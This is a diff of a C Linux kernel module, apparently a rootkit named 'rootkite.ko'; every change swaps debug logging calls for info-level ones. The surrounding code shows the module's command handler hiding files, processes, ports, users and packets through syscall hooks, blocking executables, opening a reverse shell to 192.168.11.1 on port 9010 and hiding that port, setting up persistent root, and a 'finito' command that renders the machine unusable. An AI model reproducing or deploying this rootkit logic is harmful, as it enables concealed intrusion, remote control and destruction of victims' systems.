@@ -87,7 +87,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("hide ") + 3){
             strcpy(last_data, tmpdata + strlen("hide "));
             insert_node(&files_to_hide, last_data);
-            pr_debug("Added File To Hide: %s\n", last_data);
+            pr_info("Added File To Hide: %s\n", last_data);
             print_list(&files_to_hide);
         }
     }
@@ -95,7 +95,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("hidep ")){
             strcpy(last_data, tmpdata + strlen("hidep "));
             insert_node(&pids_to_hide, last_data);
-            pr_debug("Added PID To Hide: %s\n", last_data);
+            pr_info("Added PID To Hide: %s\n", last_data);
             print_list(&pids_to_hide);
         }
     }
@@ -103,7 +103,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("hidepo ")){
             strcpy(last_data, tmpdata + strlen("hidepo "));
             insert_node(&ports_to_hide, last_data);
-            pr_debug("Added Ports To Hide: %s\n", last_data);
+            pr_info("Added Ports To Hide: %s\n", last_data);
             print_list(&ports_to_hide);
         }
     }
@@ -111,7 +111,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("hideu ")){
             strcpy(last_data, tmpdata + strlen("hideu "));
             insert_node(&users_to_hide, last_data);
-            pr_debug("Added Users To Hide: %s\n", last_data);
+            pr_info("Added Users To Hide: %s\n", last_data);
             print_list(&users_to_hide);
         }
     }
@@ -119,7 +119,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("hidepd ")){
             strcpy(last_data, tmpdata + strlen("hidepd "));
             insert_node(&ports_to_drop, last_data);
-            pr_debug("Added Ports To Drop: %s\n", last_data);
+            pr_info("Added Ports To Drop: %s\n", last_data);
             print_list(&ports_to_drop);
         }
     }
@@ -127,7 +127,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("hidee ")){
             strcpy(last_data, tmpdata + strlen("hidee "));
             insert_node(&exec_to_block, last_data);
-            pr_debug("Added Executables To Block: %s\n", last_data);
+            pr_info("Added Executables To Block: %s\n", last_data);
             print_list(&exec_to_block);
         }
     }
@@ -135,7 +135,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("show ") + 3){
             strcpy(last_data, tmpdata + strlen("show "));
             remove_node_by_name(&files_to_hide, last_data);
-            pr_debug("Remove File Hiding: %s\n", last_data);
+            pr_info("Remove File Hiding: %s\n", last_data);
             print_list(&files_to_hide);
         }
     }
@@ -143,7 +143,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showp ")){
             strcpy(last_data, tmpdata + strlen("showp "));
             remove_node_by_name(&pids_to_hide, last_data);
-            pr_debug("Remove PID Hiding: %s\n", last_data);
+            pr_info("Remove PID Hiding: %s\n", last_data);
             print_list(&pids_to_hide);
         }
     }
@@ -151,7 +151,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showpo ")){
             strcpy(last_data, tmpdata + strlen("showpo "));
             remove_node_by_name(&ports_to_hide, last_data);
-            pr_debug("Remove Port Hiding: %s\n", last_data);
+            pr_info("Remove Port Hiding: %s\n", last_data);
             print_list(&ports_to_hide);
         }
     }
@@ -159,7 +159,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showu ")){
             strcpy(last_data, tmpdata + strlen("showu "));
             remove_node_by_name(&users_to_hide, last_data);
-            pr_debug("Remove File Hiding: %s\n", last_data);
+            pr_info("Remove File Hiding: %s\n", last_data);
             print_list(&files_to_hide);
         }
     }
@@ -167,7 +167,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showpd ")){
             strcpy(last_data, tmpdata + strlen("showpd "));
             remove_node_by_name(&ports_to_drop, last_data);
-            pr_debug("Remove Port Drop: %s\n", last_data);
+            pr_info("Remove Port Drop: %s\n", last_data);
             print_list(&files_to_hide);
         }
     }
@@ -175,7 +175,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showe ")){
             strcpy(last_data, tmpdata + strlen("showe "));
             remove_node_by_name(&exec_to_block, last_data);
-            pr_debug("Remove Exec Blocking: %s\n", last_data);
+            pr_info("Remove Exec Blocking: %s\n", last_data);
             print_list(&exec_to_block);
         }
     }
@@ -184,7 +184,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
         if(strlen(tmpdata) == strlen("hide-files")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Files: %s\n", last_data);
+            pr_info("Hiding Files: %s\n", last_data);
             print_list(&files_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
                 pr_err("error hooking syscall %d\n", __NR_getdents64);
@@ -207,7 +207,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
         if(strlen(tmpdata) == strlen("hide-users")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Usefrs: %s\n", last_data);
+            pr_info("Hiding Usefrs: %s\n", last_data);
             print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
                 pr_err("error hooking syscall read\n");
@@ -218,7 +218,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
         if(strlen(tmpdata) == strlen("block-files-reboot")){
             strcpy(last_data, tmpdata);
-            pr_debug("Blocking Files & Reboot: %s\n", last_data);
+            pr_info("Blocking Files & Reboot: %s\n", last_data);
             print_list(&exec_to_block);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
                 pr_err("error hooking syscall %d\n", __NR_reboot);
@@ -238,7 +238,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
         if(strlen(tmpdata) == strlen("hide-files")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Files: %s\n", last_data);
+            pr_info("Hiding Files: %s\n", last_data);
             print_list(&files_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
                 pr_err("error hooking syscall %d\n", __NR_getdents64);
@@ -261,7 +261,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
         if(strlen(tmpdata) == strlen("hide-users")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Users: %s\n", last_data);
+            pr_info("Hiding Users: %s\n", last_data);
             print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
                 pr_err("error hooking syscall read\n");
@@ -271,7 +271,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
         if(strlen(tmpdata) == strlen("block-files-reboot")){
             strcpy(last_data, tmpdata);
-            pr_debug("Blocking Files & Reboot: %s\n", last_data);
+            pr_info("Blocking Files & Reboot: %s\n", last_data);
             print_list(&exec_to_block);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
                 pr_err("error hooking syscall %d\n", __NR_reboot);
@@ -292,7 +292,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-ports", tmpdata, strlen("hide-ports")) == 0){
         if(strlen(tmpdata) == strlen("hide-ports")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Ports: %s\n", last_data);
+            pr_info("Hiding Ports: %s\n", last_data);
             print_list(&ports_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
                 pr_err("error hooking tcp4_seq_show\n");
@@ -313,7 +313,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("reverse-me", tmpdata, strlen("reverse-me")) == 0){
         if(strlen(tmpdata) == strlen("reverse-me")){
             strcpy(last_data, tmpdata);
-            pr_debug("Starting Reverse Shell: %s\n", last_data);
+            pr_info("Starting Reverse Shell: %s\n", last_data);
             print_list(&files_to_hide);
             start_reverse_shell("192.168.11.1", "9010");
             insert_node(&ports_to_hide, "9010");
@@ -323,7 +323,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-packets", tmpdata, strlen("hide-packets")) == 0){
         if(strlen(tmpdata) == strlen("hide-packets")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Packets\n");
+            pr_info("Hiding Packets\n");
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
                 pr_err("error hooking packet_rcv\n");
             }
@@ -339,7 +339,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide-process", tmpdata, strlen("hide-process")) == 0){
         if(strlen(tmpdata) == strlen("hide-process")){
             strcpy(last_data, tmpdata);
-            pr_debug("Hiding Processes");
+            pr_info("Hiding Processes");
             switch_hide_process();
         }
     }
@@ -347,7 +347,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("rooted", tmpdata, strlen("rooted")) == 0){
         if(strlen(tmpdata) == strlen("rooted")){
             strcpy(last_data, tmpdata);
-            pr_debug("Rooting Forever\n");
+            pr_info("Rooting Forever\n");
             rooted();
             insert_node(&files_to_hide, "rootkite.ko");
             //insert_node(&files_to_hide, "ath_pci.conf");
@@ -357,7 +357,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("block-packets", tmpdata, strlen("block-packets")) == 0){
         if(strlen(tmpdata) == strlen("block-packets\n")){
             strcpy(last_data, tmpdata);
-            pr_debug("Blocking Packets");
+            pr_info("Blocking Packets");
             switch_net_hook();
         }
     }
@@ -365,7 +365,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("finito", tmpdata, strlen("finito")) == 0){
         if(strlen(tmpdata) == strlen("finito")){
             strcpy(last_data, tmpdata);
-            pr_debug("Machine Will Be Unusable\n");
+            pr_info("Machine Will Be Unusable\n");
             start_bombing_run();
         }
     }
